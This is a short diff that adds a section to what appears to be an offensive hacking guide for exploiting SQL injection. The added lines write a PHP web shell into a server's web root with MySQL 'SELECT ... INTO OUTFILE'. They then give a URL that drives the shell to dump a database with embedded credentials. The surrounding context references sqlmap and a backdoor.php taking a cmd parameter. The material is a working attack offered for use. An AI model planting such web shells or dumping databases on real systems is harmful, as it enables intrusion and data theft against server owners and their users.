@@ -64,6 +64,14 @@ sqlmap -u "http://target.com/index.php?id=1" \
 
 # Access: http://target.com/backdoor.php?cmd=id
 ```
+#or direcct forl sqlmap
+
+-- Write PHP backdoor to web root
+mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+-- Now you have SYSTEM SHELL access:
+# Visit: http://target.com/shell.php?cmd=mysqldump%20-h%20127.0.0.1%20-u%20dbuser%20-p'dbpass'%20db%20%3E%20/tmp/dump.sql
+
 
 #### Method C: Credential Reuse
 
